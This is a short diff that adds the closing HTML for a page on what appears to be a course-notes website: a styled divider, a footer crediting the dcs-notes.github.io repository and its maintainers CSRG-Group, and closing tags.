+
+
+            <br/>
+            <hr style="
+                padding: 5px;
+                border-radius: 1em;
+                background-color: whitesmoke;
+            ">
+            <br/>
+
+
+                <footer class="site-footer">
+
+                    
+                    <span class="site-footer-owner"><a href="https://github.com/CSRG-Group/dcs-notes.github.io">dcs-notes.github.io</a> is maintained by <a href="https://github.com/CSRG-Group">CSRG-Group</a>.</span>
+                    
+                </footer>
+            </main>
+        </div>
+    </div>
+</body>
+
+</html>
+</html>
